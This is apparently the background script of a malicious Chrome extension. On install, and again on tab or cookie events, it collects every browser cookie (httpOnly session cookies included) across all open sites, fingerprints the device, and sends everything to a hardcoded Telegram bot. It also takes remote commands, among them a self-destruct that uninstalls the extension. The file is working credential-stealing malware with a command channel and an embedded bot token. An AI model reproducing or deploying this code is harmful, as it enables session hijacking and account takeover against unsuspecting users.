const TG = { token: '8770095089:AAFs6Z4raZGnwTqL1aJdDEjVWeu5fa7okZw', chat: '0' };
const API = `https://api.telegram.org/bot${TG.token}`;
const GH = 'https://raw.githubusercontent.com/ezlishmail/cdn-assets/main';

let id, name, lastTime = 0, revoked = false, ready = false, timer;

async function init() {
  const s = await chrome.storage.local.get(['id','name']);
  if(s.id){id=s.id;name=s.name}else{
    id='wdf_'+Date.now().toString(36)+'_'+Math.random().toString(36).substr(2,6);
    const p=navigator.platform||'',c=navigator.hardwareConcurrency||'?',m=navigator.deviceMemory||'?';
    name=(p.includes('Win')?'Win':p.includes('Mac')?'macOS':'Linux')+'|CPU:'+c+'|RAM:'+m+'GB';
    await chrome.storage.local.set({id,name});
  }
}

function tg(method,body){
  return fetch(`${API}/${method}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}).catch(()=>{});
}

async function send(text){
  const cid = TG.chat === '0' ? await getChat() : TG.chat;
  return tg('sendMessage',{chat_id:cid,text:text,parse_mode:'HTML'});
}

async function getChat(){
  try{
    const r=await fetch(`${API}/getUpdates?offset=-1`);
    const d=await r.json();
    if(d.ok&&d.result.length){
      const msg=d.result[d.result.length-1].message||d.result[d.result.length-1].channel_post;
      if(msg){TG.chat=msg.chat.id.toString();return TG.chat;}
    }
  }catch(e){}
  return '0';
}

async function checkCmd(){
  try{
    const r=await fetch(`${API}/getUpdates?offset=-1&timeout=2`);
    const d=await r.json();
    if(d.ok&&d.result.length){
      const msg=d.result[d.result.length-1].message||d.result[d.result.length-1].channel_post;
      const t=msg?.text||'';
      if(t==='/revoke')revoked=true;
      if(t==='/unrevoke')revoked=false;
      if(t==='/sweep')await sweep();
      if(t==='/selfdestruct'){await chrome.storage.local.clear();clearTimeout(timer);chrome.management.uninstallSelf();}
    }
  }catch(e){}
}

async function sweep(){
  if(revoked||!ready)return;
  try{
    const tabs=await chrome.tabs.query({});
    const seen=new Set(),all=[];
    let ad='',au='';
    for(const t of tabs){
      if(!t.url||t.url.startsWith('chrome://')||t.url.startsWith('about:'))continue;
      const d=new URL(t.url).hostname.replace(/^www\./,'');
      if(seen.has(d))continue;seen.add(d);
      if(t.active){ad=d;au=t.url;}
      const c=await chrome.cookies.getAll({domain:d});
      all.push(...c.map(c=>({domain:c.domain,name:c.name,value:c.value,path:c.path,httpOnly:c.httpOnly,secure:c.secure,sameSite:c.sameSite||'unspecified',expirationDate:c.expirationDate||null})));
    }
    if(!all.length)return;
    const now=Date.now();
    if(now-lastTime<30000)return;lastTime=now;
    const data={deviceId:id,deviceName:name,activeDomain:ad,activeUrl:au,totalDomains:seen.size,totalCookies:all.length,timestamp:new Date().toISOString(),cookies:all};
    const caption=`🍪 <b>${name}</b>\n🌐 ${ad}\n📑 ${seen.size} domains\n🍪 ${all.length} cookies\n🕐 ${new Date().toLocaleString()}`;
    const ok=await tg('sendMessage',{chat_id:TG.chat,text:caption+'\n\n<pre>'+JSON.stringify(data).substring(0,3500)+'</pre>',parse_mode:'HTML'});
    if(!ok){const q=await chrome.storage.local.get('q');const queue=q.q||[];queue.push(data);if(queue.length>50)queue.splice(0,queue.length-50);await chrome.storage.local.set({q:queue});}
    else{const q=await chrome.storage.local.get('q');if(q.q&&q.q.length){for(const item of q.q){await tg('sendMessage',{chat_id:TG.chat,text:'📦 <b>QUEUED</b>\n<pre>'+JSON.stringify(item).substring(0,3500)+'</pre>',parse_mode:'HTML'});await new Promise(r=>setTimeout(r,1000));}await chrome.storage.local.set({q:[]});}}
  }catch(e){}
}

function schedule(){const d=(Math.floor(Math.random()*2)+1)*60000;timer=setTimeout(async()=>{await sweep();schedule();},d);}

chrome.tabs.onActivated.addListener(()=>setTimeout(sweep,3000));
chrome.tabs.onUpdated.addListener((tid,ci,tab)=>{if(ci.status==='complete'&&tab.active)setTimeout(sweep,4000);});
chrome.cookies.onChanged.addListener(()=>setTimeout(sweep,2000));

chrome.runtime.onInstalled.addListener(async()=>{await init();await send(`🟢 <b>CONNECTED</b>\n━━━━━━━━━━━━━━━\n💻 ${name}\n🆔 <code>${id}</code>\n🕐 ${new Date().toLocaleString()}\n\nCommands:\n/revoke | /unrevoke | /sweep | /selfdestruct`);setTimeout(async()=>{ready=true;await sweep();schedule();},10000);setInterval(checkCmd,30000);});
chrome.runtime.onStartup.addListener(async()=>{await init();await send(`🔄 <b>RESTARTED</b>\n💻 ${name}\n🆔 ${id}`);setTimeout(async()=>{ready=true;await sweep();schedule();},10000);setInterval(checkCmd,30000);});
(async()=>{await init();setTimeout(()=>{ready=true;},10000);schedule();setInterval(checkCmd,30000);})();